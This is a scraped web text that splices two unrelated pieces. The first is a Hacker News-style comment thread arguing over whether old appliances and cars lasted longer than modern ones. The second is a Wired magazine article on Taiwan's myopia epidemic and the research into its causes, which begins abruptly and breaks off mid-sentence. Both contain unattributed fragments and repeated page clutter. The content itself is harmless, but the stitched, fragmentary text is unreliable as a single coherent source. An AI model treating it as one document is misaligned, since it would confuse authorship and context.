agorootparentprevYeah this article would be a lot more interesting if there were a conspiracy to buy up all of the indestructible appliances made more than x decades ago. If they really were that much better then more of them would be around today. reply piva00 7 minutes agorootparentI live in Sweden and can find quite a lot of old school kitchen appliances in flea markets&#x2F;thrift stores. I bought my Technivorm Moccamaster coffeemaker in one, a Bamix immersion blender, a Bosch stand mixer, all of them from around the 80s and still working 100% fine. reply coldtea 2 hours agorootparentprevNot really, since most consumers just go for whatever has the more \"features\" and is marketed at them. reply ggm 2 hours agoparentprevI think your survivors bias thing is very true. I&#x27;ve used old things which would survive nuclear blast, and still have some. And, old things which were gimcrack rubbish and unusable.Some old plastics de-polymerised badly in heat. A lot of old chrome and tin plating corrodes. Bone handled cutlery is not designed for dishwashers. Sure, the mix master is going strong but it was gold plated when my mother in law got it. Same with the cast aluminium mincer.That said, I fixed a 24 year old magimix by replacing the motor starter, everything else is fine except its on its second polycarbonate bowl since dishwashers: now only washed by hand. reply irjustin 6 hours agoparentprev> Modern cars are much, much more reliable and durable than ones built at any time in the past.Forget \"durability\" - safety is paramount. Those old cars were tanks, simpler, last longer and easier to repair but absolute death traps and dump smog.[Edit]Guess they didn&#x27;t last longer, either way I&#x27;m happy to leave behind the cars of yester-year... even the 90&#x27;s a bit sketch (though WAYYYY better). reply woopwoop 6 hours agorootparentThey were simpler and easier to repair, but they absolutely did not last longer. reply edrxty 6 hours agorootparentOn average they didn&#x27;t (oh no, that repair costs more than the \"car is worth\" as if that&#x27;s a metric that actually means anything) but it was far easier to keep one running indefinitely. You could take an engine to a small machine shop and get the head and block resurfaced, valves reamed and cylinders lapped. Without any electronics to fail it was just a block of metal that was slowly losing material and a quick hit with a file could even out any imperfections leaving it like new, just with very slightly more displacement.Modern engines are way more reliable because they have coatings and materials that will last nearly indefinitely in most parts of the engine but they&#x27;re built on proprietary sensors and electronics that need a steady stream of replacements and secret software to debug.We could make cars last indefinitely from a supply chain perspective, but commoditizing software and electronics would make them very marginally more expensive. We absolutely can&#x27;t have that because, drum roll for the 1000th time, 99% of the population doesn&#x27;t give a flying fuck and wants cheap shit at all costs. reply ip26 4 hours agorootparentIt’s the old fuel injection vs carburetor debate. Do you want something that usually runs for 200k miles without a single problem, but takes a fancy shop to fix? Or do you want something that needs a complete rebuild every three months and needs to be retuned for your ski trip, but can be repaired by a high school boy with a tongue depressor, a q-tip, and a hammer?The rapid exodus of carburetors shocked and dismayed many right-to-repair folks, but I think we now see with laptops and cell phones that all else equal, consumer preference strongly favors trading repair headaches for the otherwise more compelling product (thinner, faster, lighter, more powerful, etc) reply rpcope1 4 hours agorootparentI think you can have it both ways honestly. A TBI setup with a wasted spark ignition is at least as easy to work on a carburetor, with little or no extra complexity and way less headaches, while removing a lot of the problems older stuff had (no points, condensers and caps going bad, no need to mess with the jets, etc.). You can have it both ways, the manufacturers and consumers just have to give a shit. reply AussieWog93 2 hours agorootparentprevOne thing I suspect has tipped the scales in favour of less repairable products is the massive decline in social capital.30-40 years ago, if your lawnmower broke down you&#x27;d ask Dave from two doors down to come and have a look at it.Now, you&#x27;d either take it to a professional repairman (and get it back 2 weeks and $100+ later), try to work it out yourself via online tutorials, or just throw it in the bin.Either way, it&#x27;s far more painful for a product to bee temporarily out of service these days than it once was. reply lawgimenez 5 hours agorootparentprevAs someone who drives an “old” Honda 2006, I’m surprised that this machine is still running very good. I could just take it to my local shop and had it fixed in 1-2 days. Based on my logs, I took the car for repair on average of 3-4 times a year.I am looking to purchase a new family vehicle in the future but with all the softwares, screens, and fancy stuffs I am not sure if I liked it. Anyone feels this way? reply dehrmann 2 hours agorootparent> I’m surprised that this machine is still running very goodI&#x27;m not. It&#x27;s a Honda. reply Baeocystin 3 hours agorootparentprevI really wish there was a new car that I wanted to buy, because my 1998 Jeep isn&#x27;t getting any younger. But holy crap is the modern car a dumpster fire of shit from a UI perspective. Although it looks like at least some manufacturers are starting to take note: https:&#x2F;&#x2F;futurism.com&#x2F;the-byte&#x2F;car-touchscreens-buttons-back reply lawgimenez 1 hour agorootparentYes that article sums up my feelings on the modern car. But my main concern are the repairs 5-10 years from now. It’s crazy to think that a car would be recalled by just some software glitch if that’s what I read is correct. reply a_t48 1 hour agorootparentprevMy car has physical buttons for climate control, volume, lights, etc but also a nice sized touch screen for CarPlay. I got the last year before VW took away the steering wheel buttons with capacitive replacements, though it sounds like they too are waking that back. reply MichaelZuo 5 hours agorootparentprevYou can have that level of quality and care for the entire car, not just limited to the drivetrain and electronics, and it&#x27;s probably even in a showroom right now waiting for buyers, just at your nearest Rolls Royce dealership. reply YouWhy 3 hours agorootparentI would not expect RR to be particularly high quality, due to:1. Small production batches,2. Low typical usage - most RR owners do not use it to commute on a daily basis, hence do not face high reliability requirements,3. The ability of the typical buyer to overspend on maintenance, whether preemptively or on-demand. reply gocartStatue 3 hours agorootparentSmall production batches are absolutely required for high quality (see Toyota, TQM) reply dehrmann 2 hours agorootparentBut there isn&#x27;t enough overall volume to ever get the kinks worked out. replyrpcope1 4 hours agorootparentprevDepends what era of cars we&#x27;re talking. There&#x27;s a ton of stuff from the 90s and 2000s like GM trucks, that I strongly suspect will be on the road longer and in greater numbers than stuff 10 years newer. The mid to late 90s and early 2000&#x27;s seems to be the sweet spot where fuel injection and simple electronic ignition, and stuff using older designs (engine&#x27;s, etc.) that had to be built heavier, combined with better metallurgy, better oils, better gas, and so on, meant that the vehicles, when taken care reasonably, would go well past a quarter million miles. There&#x27;s a ton of stuff now, that given much weird crap is on there and how much stuff is done to squeeze every last MPG out (like a lot of GDI setups, auto start&#x2F;stop, transmissions that pull into neutral automatically at a stop, etc.) that I really doubt will make it as far. Even as far as repairability, a 90&#x27;s 4L60E or 4L80 can be repaired way, way more easier by way more people, in an economic fashion than a lot of later transmissions (that you may as well just throw away). I&#x27;m sure this holds across other brands too; Volvos come to mind, as the older rear wheel drive red block cars were certainly far better built, more reliability, and had an unbelievably better lifespan than the absolute garbage Volvo has put out after Ford bought them. reply pkdpic 3 hours agorootparentprevYeah those old timey pedestrians didn&#x27;t stand a chance. Seriously though good point I think, but what about crumple zones? reply somewhat_drunk 6 hours agorootparentprevThey didn&#x27;t last longer.https:&#x2F;&#x2F;auto.howstuffworks.com&#x2F;under-the-hood&#x2F;diagnosing-car... reply fipar 6 hours agorootparentWell, they do (present tense) last longer in the sense that they’re still around and working, which of course doesn’t mean newer cars are worse. It’s a bit like saying someone who’s 70 lives longer than someone who’s 7.I think newer cars seem to be more reliable but older cars probably lasted longer than you think, it’s just that your view is skewed due to the market you’re used to (reading your link, while a million miles is a lot, though not unheard of for a taxi, the mention of 17 years as if that’s and old car is something I find surprising.It’s common where I live to see cars from the 60s or 70s still being driven. And I don’t mean maintained classics (though those exist too), I mean just old rusty cars that still work.All this to say that while you’re most likely right about newer cars being more reliable (and they’re certainly safer, which is more important), that doesn’t mean older cars stopped working after 20 or 30 years, it just seems your view is skewed because you live in a place where a 17yo car is considered old. reply ProcNetDev 5 hours agorootparentThe population of old cars that you see driving around today is very different from the population of old cars that ever existed.https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Survivorship_bias reply coldtea 2 hours agorootparentprev>It’s a bit like saying someone who’s 70 lives longer than someone who’s 7.It&#x27;s more like saying that someone who&#x27;s 7 && depends on factory-only parts, processors, and software, that wont be available in 20 years, with ever more complex designs being pushed in between, will not make it to 70. reply pixl97 5 hours agorootparentprevAn AMC Gremlin came out in the 1970s, and you don&#x27;t see almost any at all because they were complete crap.Especially the 70s US cars and somewhat later were complete shit and lead to the meteoric rise of Japanese cars in the US.

My previous soft was from Ikea. Of course Ikea makes cheap disposable furniture but this sofa, IMO, was not one of those. It was made of real wood, not particle board. It was super well designed. It assembled into 4 parts using slots and a few very large steal bolts and was also easy to disassemble for moving. It&#x27;s entire cover was easy to remove so you could clean stains or easily replace it. Same for the cushions. And it was comfortable. It was under $1000 (note: I know Ikea redesigns things so the same soft today might not be as good as that same model from 2016)Moving overseas I had to buy a new sofa in 2021. Middle of COVID, Ikea didn&#x27;t have any I couldn&#x27;t wait. The sofa I ended up with is the cheapest shit sofa I&#x27;ve ever owned. The materials are clearly inferior. No part of it is cleanable. The cushions are one sided so can not flip them in 4 directions, they only fit one way. I got tired of looking and settled on these though, expecting to replace them.Anyway, my point was (a) I understand your POV but also (b) there are possibly some good under $1000 sofas.

As an example, Crate and Barrel are known to make good, high-quality couches, and many of them are far less than $5000 reply xp84 4 hours agorootparentI went to try to see conclusively if you were correct. A pretty basic sofa at C&B is $1,800 - $2,000. In 1990 you could buy a basic Bassett sofa at J.C. Penney for $599 [1] -- $1407 in 2023 dollars. Furniture from Sears and Penney&#x27;s (regardless of whether it was fashionable) was of fine quality, in that it held up for decades. I know because we had furniture like this in our home at the time.So this tells me that the price for a sofa (that is made domestically and not slapped together from particle board, a half inch of foam, and about 4 springs) has gone up by 25-30%. And I think you&#x27;re saying that therefore, this isn&#x27;t an utterly crazy price hike. I&#x27;d agree it&#x27;s modest.Thing is, I think what&#x27;s changed is demographics. In 1990, a LOT of people bought furniture at a department store or furniture store. They could afford it, but also here&#x27;s the interesting part: It was much more rare then to find a $250 sofa. If that was your budget, you just bought a used good sofa and you probably got a better product. When super cheap everything appeared in the late 90s, it drove out the good manufactured goods, and many of the stores that sold those good items. People felt like buying the quality of things they used to buy would be extravagant, since they could buy an IKEA or Walmart version for less than half, and also, many families started to be worse off financially than their parents&#x27; generation had been, adding to their feelings of frugality.

To follow their example: after a hundred years of building juicers, we should have global juicer expertise. The generations of juicers created, the feedback on the models, the breakage rate should have generated a general knowledge of the best techniques for juice extraction, of the materials that are most adequate for the task, and how assembly should be designed for maximum durability. But we don&#x27;t. What we have instead is cheap juicers, which underlines the point that cheap is what matters in how the design. Be it for maximum profitability or low price point.Following on their other example about coffee grinders: last year I renewed my coffee making stack. I like coffee such az many here, and wanted good hardware; quality first, and cost a secondary concern. I took care of asking friends, watching videos, going on forums, reading tests. I ended up investing quite a bit in a Baratza machine, which is quite celebrated and very repairable, they sell replacement parts at reasonable cost, they even give you tips on how to extend longevity. All marks of a manufacturer who wants their craft to last. I suspect that you might be able to find the one juicer on some small website which ships direct from the manufacturer in Vermont. Juicing enthusiasts share their experience and knowhow on juicing websites and all swear by their mothers that this one brand revolutionized juicing for them. For equipment with any mild complexity, you need to acquire a relative expertise, and shop in the outskirts of the market. And obviously, you have time for that only for the stuff you care about.As per not picking the cheapest option, price isn&#x27;t a good indicator of quality. Certainly if you keep surrounding yourself with the cheapest copies, things will always break around you. But you&#x27;ll get more reliability from a Corolla made by a manufacturer which obsesses about quality, then from a Mercedes which targets premium and luxury. Additional manufacturing cost is generally used to add more features and better looking materials, rather than producing sturdier things.Anecdotally, I am still using the peeler I bought when I was a student over 20y ago.

They’re maybe only slightly above landfill in terms of entropic stability.Edit: to be fair I bet they were warrantied, but still reply jonahss 6 hours agoprevOk no.First of all: survivorship bias. All of the old appliances that still work are only the ones which still work. This goes for the author&#x27;s juicer.Second: things which have investment attention now are excellent quality and things which are waning towards the end of their lifecycle are having the last few corners cut before the Private Equity firm that now owns them throws in the towel, throughly wrung dry. Author&#x27;s examples: staples - the age of paper documents is over. matches - the Bic lighter is a modern marvel. plastic grocery bags - banned in more places every year. pens - same as staples.But now, turn your eye to products being actively invested in now? Some may be at their peak this very moment.And if you want something quality, go spend for it. I&#x27;ve got an industrial stapler like you wouldn&#x27;t believe, 50 sheets of paper easy. reply CrazyStat 5 hours agoparent> pens - same as staples.I focused in on pens as I was reading the piece because I&#x27;m something of a pen snob, something I realized when I was at a job fair one day in college and I had a brief feeling of aversion when a recruiter offered me a shitty free pen.It&#x27;s not hard to get good pens, and they&#x27;re not particularly expensive. $1-2&#x2F;pen will get you very solid ball-point pens that write smoothly and reliably. Some of them can be refilled to save more money and reduce waste. There are wide varieties of styles, color, and point fineness to choose from.If you usually buy shitty pens for $0.10 each or whatever that may seem like a lot, but unless you go through multiple pens a day or something it&#x27;s really not. The $10&#x2F;year or so I spend on slightly nicer pens is well worth it to me.I suspect there are probably also similar quality options available for things like staples and matches, but I&#x27;m not familiar with those. reply jonahss 5 hours agorootparentI agree. I feel like the author is upset at pens given out at banks and restaurants to sign stuff. As cheap as possible, Minimum Viable Pen for sure.I buy a few packs of my favorite uniball pens every year and sprinkle them around the house and in all my bags. Very happy with them. reply ghusto 50 minutes agoparentprev> First of all: survivorship biasSo let&#x27;s take all the things that I had in the 90s that I had to replace because they broke:- ...You can say I&#x27;m only remembering the positives, honestly, I can not think of a single thing I _had_ to replace. I remember buying new things, but it was always because I wanted the new-shiny, not because I had to.Survivorship bias isn&#x27;t \"only being able to remember the positives\", it&#x27;s _concentrating_ on the positives and neglecting to take into account the negatives. reply edrxty 5 hours agoparentprevSeconded, though I&#x27;d add that with the current concerns about climate change and resource utilization, we need to think a bit more about product lifecycle and this is a reasonable way of illustrating that.If the embodied environmental impact of a product increases 10% to make it last 100% longer then we need to think about making that change rather than producing twice as many to replace the broken ones. reply jonahss 5 hours agorootparentone thing about some of the shitty products out there today is we got MUCH better at making things out of less material. So they break easier and wear out faster, but we&#x27;ve been able to reduce material usage along with price.If you&#x27;re a person who loses pens or holds onto them so long the ink dries up, it&#x27;d be better to waste an object made as cheaply as possible than one made to last.This is a balance to play as well. reply edrxty 4 hours agorootparentAbsolutely, it&#x27;s a complex game.The easiest way to clean it up significantly is to better tax industry such that energy, resource usage, and transportation are all represented in the price such that the economy actually reflects the environmental impact of production rather than just the business costs of the moment. reply xp84 4 hours agoparentprevYour second point is great. But your first:It&#x27;s not (or at least, mostly not) survivorship bias. We aren&#x27;t only talking about \"Walk around a thrift store or grandma&#x27;s house and grab a handful of appliances\" because yup, they&#x27;ll all still be working. But we can also ask our parents (or if we&#x27;re over 30 ask ourselves) how many washers or dryers or mixers or blenders or televisions or whatever were required to be replaced after 6-48 months due to them spontaneously dying irreparably. Many such things did end up in the landfill then -- but mainly because people were eager to trade up to new shiny ones with better performance or features because consumer goods were improving every year back then.(Compared to now when the main \"advancements\" happening to most household goods, if any, is the replacement of buttons with touchscreens and unreplaceable circuit boards, adding a wi-fi module and companion \"App,\" and addition of subscription services.) reply dw_arthur 4 hours agoparentprevI don&#x27;t buy the survivorship bias thing for the most part. My mother has her original dryer, washer, deep freezer, and refrigerator all running at her house. These are all 40+ years old except for the washer which is probably 30ish years old. Also her furnace + water heater are 40 years old. If it was survivorship bias some of these appliances would&#x27;ve died. reply pelario 4 hours agorootparentAre you saying that none of their original appliances have died?If not, do you realize that you claiming \" If it was survivorship bias some of these appliances would&#x27;ve died.\" When \"these\" refers exclusively to those who haven&#x27;t died is the very definition of survivorship bias? reply dw_arthur 3 hours agorootparentI think a washer died around 35 years ago and her current washer is 35 years old. It seems improbable that so many 40+ year old appliances survived in one home if reliability rates or ease of repair were not significantly better in the past. reply xp84 3 hours agorootparentprevI think he&#x27;s saying Mom would have definitely remembered if she had had to replace every darn appliance in her house every 2-5 years, the way we do now, before eventually lucking out to find the one good washer, dryer, dishwasher, etc. made in their respective years. reply xp84 3 hours agorootparentprevYou&#x27;re completely right. Things also usually had a warranty longer than the nearly-universal 365-day warranty they have now. It&#x27;s utterly disgusting to me that you can purchase a refrigerator -- an item which weighs like 800 pounds, has a huge amount of metal in it, and which everyone would agree would be insane to be a yearly purchase, and yet if it needs even an average repair 13 months from purchase, it can easily cost more to fix than the replacement cost and thus be totaled.In my opinion, any device whose manufacture requires an amount of resources approaching \"large appliance\" levels should be required to have a 10-year parts and labor warranty. I don&#x27;t care if that makes them cost more. I hope it makes them cost more. It&#x27;s insane the way it is. reply ArrowH3ad 4 hours agorootparentprevn = 1 is not a great sample size for analyzing long-term trends with multiple factors (purchase price, maintenance&#x2F;treatment of applicances, environment, etc) reply pixl97 4 hours agorootparentprevI mean, what did your mother pay at that time?, because there was plenty of appliances from back then that were total crap too. reply dw_arthur 4 hours agorootparentThey&#x27;re name brand appliances, kenmore and whirlpool while the deep freezer is a revco. They don&#x27;t look like top of the line models, probably just whatever was mid grade at the time. I thought about telling her to throw them away due to power usage but used a kill-a-watt to determine it wasn&#x27;t worth it. I think the fridge and freezer each cost around $25&#x2F;year to run. reply jonahss 5 hours agoparentprevThere&#x27;s another important element: the ability to judge quality.Many people (especially baby boomers) learned a shortcut, by using brand name as a proxy for quality of goods. The problem with this is that all those brands eventually outsourced and sold themselves and cashed in on the old brand quality association. Cheapening and cheapening as the producers realized that people still bought their product no matter what the quality was. Also, people equate flair and style of product with the quality, because they aren&#x27;t actually good judges of quality. You can find many cheap junk products today that retain a poor skeuomorphic shadow of their former glory. At some point consumers learned \"well if it has the shiny chrome it&#x27;s a good one\" and producers learned they could add a chunk of shiny plastic and people would prefer their product.Brand names are worthless now, for the most part, and if you&#x27;re not good at judging quality yourself, it can be a difficult consumer landscape to navigate. reply mwbajor 4 hours agoparentprevEveryone is saying \"survivorship bias\" but I don&#x27;t think its that easy. How is survivorship biased by reparability? Is the widget still considered more durable if it breaks but can be fixed? I would say so. reply pixl97 4 hours agorootparentThere is some correlation here. If something &#x27;never&#x27; breaks its not very likely to be repairable since no one will make spare parts for it. At the other side if something always breaks but is cheap in total cost, parts are commonly unavailable too, as people replace the entire item. reply drcode 6 hours agoprevI feel arguments like this always ignore the fact that buying a toaster in 1950 was a major investment for a family, and if you want to spend $2000 on a high-end toaster in 2023, which is probably equivalent in inflation-adjusted price to the 1950s toaster, it will probably also be very nice. reply fullstop 6 hours agoparentA toaster in 1951 was $21, which is about $250 today.I would argue that a $250 toaster today is still not a \"buy it for life\" item, but it would certainly have a lot of bells and whistles and almost no user-serviceable parts. reply willis936 6 hours agorootparentToasters are an interesting case study.

I have to push it down between 5 and 10 times before it will trigger, without fail. I&#x27;ve had this across most all toasters I&#x27;ve owned.My second biggest issue is related to the same mechanism: the \"pop\" is impotent and does nothing to eject what&#x27;s being toasted. The most I can hope for is that I can manually push the lever up.The next biggest issue is with heating element distance. If there&#x27;s anything that is wider than a slice of wonder bread it&#x27;s going to get sizzled by the heating element.

When that house was built - there was no electricity. That had been added later - and you could still see where channels had been hewn into the wall to put in cables and later plastered over again.But everything electrical in that house was repairable to a degree that seems unimaginable today.For example, every single power plug had screws. If you removed those, it would come apart in two halves, to reveal another set of screws that held the cable in. If you undid those screws, you could easily shorten or replace the cable - in case it was broken. There was no glue, no solder, and most of the plugs had even metal inserts for the screws to go into.The appliances on the other end of the cables were just as easy to take apart and put back together. And their insides were (mostly) free of proprietary parts - almost everything was \"standard\" stuff, that you could get replacements for, from a supplier of your own choice.Many of those appliances still worked perfectly fine, after my grandparents had died, and the house had been torn down. That doesn&#x27;t mean they never broke - but if they did, my grandpa was able to easily fix them himself. And if he could not fix something, he still was able to salvage it for parts that then could be used to fix other things. reply mijamo 2 hours agoparentI do not know where you are from but the description of the plugs basically match the ones still installed in France (although many don&#x27;t require screws because they have built it fixations that just \"click\"), and I have never seen one that requires glue or soldering. Appliance life expectancy has also gone way up statistically, just like cars, although people often complain about the complexity of both. Most washing machines are pretty easy to fix for the parts that do break for instance. Of course if you get a dead motherboard it is not easy to fix, but usually wear and tear happens more on the mechanical pieces that are well documented and also now full of tutorials on how to change them on the internet.

Shrinkflation is the quintessential symptom of the problem, from the perspective of the consumer. But it&#x27;s not just \"how do we raise the price per pound without raising the price per unit.\"Another angle to view this from is that saving money is jot worthwhile. People who get paid in dollars need to spend them quickly, so on offer around them is a plethora of goods and services that they can spend it on. Nobody saves for stuff so that stuff better be cheap, I&#x27;m sure the ideal price for an item is some function of the median weekly paycheck and apartment rent.Viewed from yet another angle (and IMO a more informative one if you want to get at what exactly is going on here objectively) you see that inflation has a general corrosive effect on value and quality. The velocity of money increases, and the value of holding money decreases the longer it is held. So businesses trying to maximize profit have to go from getting people to spend their money to getting their money first. They have to have fast turnaround time for that capital. They have to pump out as many units as they can as fast as they can, those units have to degrade quicker than the money loses value or they can&#x27;t make a profit. This creates a culture of unscrupulousness, the phenomenon compounds and speeds up over a few generations.

Taiwan Offers a Warning, and a Cure So many people are nearsighted on the island nation that they have already glimpsed what could be coming for the rest of us. ILLUSTRATION: VANILLA CHI DOING SURGERY ON the back of the eye is a little like laying new carpet: You must begin by moving the furniture. Separate the muscles that hold the eyeball inside its socket; make a delicate cut in the conjunctiva, the mucous membrane that covers the eye. Only then can the surgeon spin the eyeball around to access the retina, the thin layer of tissue that translates light into color, shape, movement. “Sometimes you have to pull it out a little bit,” says Pei-Chang Wu, with a wry smile. He has performed hundreds of operations during his long surgical career at Chang Gung Memorial Hospital in Kaohsiung, an industrial city in southern Taiwan. Wu is 53, tall and thin with lank dark hair and a slightly stooped gait. Over dinner at Kaohsiung’s opulent Grand Hotel, he flicks through files on his laptop, showing me pictures of eye surgery—the plastic rods that fix the eye in place, the xenon lights that illuminate the inside of the eyeball like a stage—and movie clips with vision-related subtitles that turn Avengers: Endgame, Top Gun: Maverick, and Zootopia into public health messages. He peers at the screen through Coke bottle lenses that bulge from thin silver frames. This article appears in the November 2023 issue. Subscribe to WIREDPHOTOGRAPH: SINNA NASSERI Wu specializes in repairing retinal detachments, which happen when the retina separates from the blood vessels inside the eyeball that supply it with oxygen and nutrients. For the patient, this condition first manifests as pops of light or dark spots, known as floaters, which dance across their vision like fireflies. If left untreated, small tears in the retina can progress from blurred or distorted vision to full blindness—a curtain drawn across the world. When Wu began his surgical career in the late 1990s, most of his patients were in their sixties or seventies. But in the mid-2000s, he started to notice a troubling change. The people on his operating table kept getting younger. In 2016, Wu performed a scleral buckle surgery—fastening a belt around the eye to fix the retina into place—on a 14-year-old girl, a student at an elite high school in Kaohsiung. Another patient, a prominent programmer who had worked for Yahoo, suffered two severe retinal detachments and was blind in both eyes by age 29. Both of these cases are part of a wider problem that’s been growing across Asia for decades and is rapidly becoming an issue in the West too: an explosion of myopia. Myopia, or what we commonly call nearsightedness, happens when the eyeball gets too long—it deforms from soccer ball to American football—and then the eye focuses light not on the retina but slightly in front of it, making distant objects appear blurry. The longer the eyeball becomes, the worse vision gets. Ophthalmologists measure this distortion in diopters, which refer to the strength of the lens required to bring someone’s vision back to normal. Anything worse than minus 5 diopters is considered “high myopia”—somewhere between 20 and 25 percent of myopia diagnoses around the world are in this category. In China, up to 90 percent of teenagers and young adults are myopic. In the 1950s the figure was as low as 10 percent. A 2012 study in Seoul found that an astonishing 96.5 percent of 19-year-old men were nearsighted. Among high schoolers in Taiwan, it’s around 90 percent. In the US and Europe, myopia rates across all ages are well below 50 percent, but they’ve risen sharply in recent decades. It’s estimated that by 2050, half the world’s population will need glasses, contacts, or surgery to see across a room. High myopia is now the leading cause of blindness in Japan, China, and Taiwan. If those trends continue, it’s likely that millions more people around the world will go blind much earlier in life than they—or the societies they live in—are prepared for. It’s a “ticking time bomb,” says Nicola Logan, an optometry professor at the UK’s Aston University. She wasn’t the only expert I talked to who used that phrase. Because so much of Taiwan’s population is already living life with myopia, the island nation has already glimpsed what could be coming for the rest of us. And in a rare confluence, the country may also be the best place to look for solutions. ILLUSTRATION: VANILLA CHI ON THE BULLET train south from Taipei, you can see the smog hanging over Kaohsiung from miles away, blurring the edges of the buildings. During the Japanese occupation, which ended in 1945, what had been a small trading port transformed into one of Taiwan’s biggest cities, a riot of heavy industry and shipbuilding. Over the next four decades, as Taiwan made the rapid transition from a predominantly agricultural economy to a manufacturing powerhouse, the lives of its citizens shifted too. Families flocked into cramped apartment blocks that still make up much of the urban housing. Education for children was mandatory and became increasingly intense. A network of after-school establishments called “cram schools” sprang up, making room for parents to work long hours without the childcare support from elderly relatives they would’ve had in the old society. At the end of the school day, some kids would board a bus, not to go home, but to ride to their cram school, some of which were open until 9 pm. Pei-Chang Wu was born in Kaohsiung, at the height of the city’s transformation, in 1970. His grandparents, neither of whom were myopic, were farmers in central Taiwan. Both of his parents were teachers, and like many Asian parents, they put a huge emphasis on education as one of the few levers they could pull to move up through society. His father enforced a strict daily routine: up at 5 am for calligraphy and violin practice, school from 7:30 am to 4 pm. Once Wu got home in the evenings he had to complete his schoolwork. On the weekends, he participated in calligraphy competitions. By the age of 9, Wu had been diagnosed with myopia. MOST POPULAR CULTURE Brazilian Gamers Aren't Waiting for Hollywood.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON Pei-Chang Wu. PHOTOGRAPH: AN RONG XU Across the modernizing world, this pattern repeated itself. For economies to continuously expand, education had to become central, and as this happened, the rates of myopia started to climb. But hardly anyone noticed, in Taiwan or anywhere else. If current trends continue, it’s likely that millions more people around the world will go blind much earlier in life than they—or the societies they live in—are prepared for. Then, during one summer in the early 1980s, a group of incoming college students gathered at Chengkungling, a military training facility in central Taiwan, for a ceremony to mark the beginning of their mandatory national service. The United States had recently cut diplomatic ties with the island and formally recognized the government in Beijing, and cross-strait tensions were high. At first, the early morning ceremony went smoothly. A single cadet—tall, good posture—received a rifle on behalf of his classmates, symbolizing their duty to defend their country. As the ministers of education and defense rose to deliver their speeches to the young men they hoped would be the future of Taiwan, the sun also rose higher into the sky behind the stage. The government officials were dazzled by the glare reflecting back at them from hundreds of pairs of glasses. The ceremony was the seed for a joke about how to ward off an alien invasion—just ask Taiwanese students to look up—and the spark for the government’s fight against myopia. The first step was to understand the scope of the problem. The president, alarmed by what had happened, asked health officials to begin a regular survey of myopia rates in Taiwan. It revealed a previously hidden epidemic, which seemed to be getting worse. By 1990, the myopia rate among Taiwanese 15-year-olds had risen to 74 percent.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON By the time Wu started medical school in the early 1990s, he was seeing floaters—“strange animals in the sky,” as he called them—when he closed his eyes. At first, he dismissed them and focused on his budding career as an ophthalmologist. But during his residency, Wu examined hundreds of patients with retinal detachments who’d had the same symptoms. He grew worried about his own long-term vision. So he asked one of his professors to examine his eyes. “He found a break in my retina,” Wu said. He was lucky. It was a small tear, minor enough to be fixed with a laser in five minutes. Shining a light through the pupil creates scar tissue that the retina can reattach to. “The laser saved me,” Wu said. “Otherwise I would be blind in one eye.” Wu decided he had a responsibility to rescue others from high myopia and its potential complications. “If I cannot save myself, we should save our next generation.” It wasn’t until the mid-1990s that a better understanding of what caused myopia—and what could prevent it—finally cracked open. In 1999, the government convened a group of experts in medicine and education to try to fix the problem. Jen-Yee Wu, who worked at the Ministry of Education and had done his doctoral thesis on eyesight protection, was asked to write a set of guidelines for schools to address nearsightedness. Later that year, he published a thin green book full of advice for teachers. It paid careful attention to desk height (to keep texts the right distance from the eyes) and room lighting, and advocated eye relaxation exercises, including a guided massage of points around the eyes and face. The book also advised giving children more space in their notebooks to pen the intricate characters that make up written Mandarin. And it formalized the 30/10 rule: a 10-minute break to stare into the distance after every half hour of reading or looking at a screen. None of it worked. Nearsightedness rates continued to climb because, as it turned out, Taiwan, and the world, had been thinking about how to address myopia completely wrong. ILLUSTRATION: VANILLA CHI HERE IS A non-exhaustive list of things that have been blamed for nearsightedness: pregnancy, pipe smoking, brown hair, long heads, bulging eyes, too much fluid in the eyes, not enough fluid in the eyes, muscle spasms, social class. “Any ophthalmologist who experienced a night of insomnia arose in the morning with a new and usually more bizarre theory,” wrote Brian Curtin in an influential 1985 book about myopia. Folk theories have changed with technologies. Ask people today and they’re likely to blame smartphones and video games.

Those activities all come under the broad umbrella of “near work”—using your eyes to look at something close to your face—which had been the leading scapegoat for myopia for centuries. In 1611 the astronomer and scientist Johannes Kepler wrote, “Those who do much close work in their youth become myopic.” In the mid-19th century, there existed a contraption called the “myopodiorthicon,” which was designed to gradually move a book backward during reading to strengthen the eye’s ability to adjust to objects at different distances. The Hygiene of the Eye in Schools, by Hermann Cohn, published in 1883, paid careful attention to lighting and advocated the use of headrests to physically prevent the eyes from coming too close to the text during reading.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON In 1928, British ophthalmologist Arnold Sorsby surveyed Jewish boys in East London and discovered that they were more myopic than their non-Jewish peers. At first, he thought this was because of the extra time spent doing near work while studying holy texts. Eventually, though, he came to believe there was a genetic element to myopia. He conducted studies of twins that seemed to confirm this: The severity of myopia was more similar among identical twins than fraternal twins. The science of genetics was in vogue, and as Sorsby’s theory swept away Victorian concerns about the state of the schoolhouses, it became dogma for decades. Myopia became seen as a condition to be managed, not a disease that could be prevented. It wasn’t until the mid-1990s that a better understanding of what caused myopia—and what could prevent it—finally cracked open. In these years, an Australian researcher called Ian Morgan stumbled on a scientific mystery that would consume the next 25 years of his life. Morgan, now a genial 78-year-old with sun-wrinkled skin and large dark-framed glasses, was working as a research fellow at the Australian National University in Canberra, where he was studying the neurotransmitter dopamine and its role in the eye’s signaling systems. Back then, he didn’t know much about myopia—he could barely tell you the difference between far- and nearsightedness. Pei-Chang Wu with a patient.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON But as a part of his weekly reviews of the latest scientific literature, he started to see some of the first evidence coming out of Asia about the growing myopia epidemic. He couldn’t understand how myopia rates could be close to 80 percent for kids leaving high school in East Asia and so much lower in his native Australia. He soon found other research casting doubt on Sorsby’s genetic view of myopia. In Inuit populations, during the 1970s, myopia incidence increased from 5 percent to more than 60 percent prevalence in the span of one generation. Genetics couldn’t explain such a jump. The sharp increase in schooling among younger Inuits, however, might. In the early 1990s, researchers had found that ultra-orthodox Jewish boys are more myopic than their sisters—something that was likely due to the extra studying they have to do. Morgan started to seek out a better understanding of what causes myopia, and by the early 2000s, he was convinced there had to be a behavioral reason for the boom. But if near work was really to blame, why hadn’t the interventions tried in China and Taiwan made any difference? In 2003, with colleagues Kathryn Rose and Paul Mitchell, Morgan began a two-year study of thousands of 6- and 12-year-olds in Sydney, looking for lifestyle differences that might explain their lower 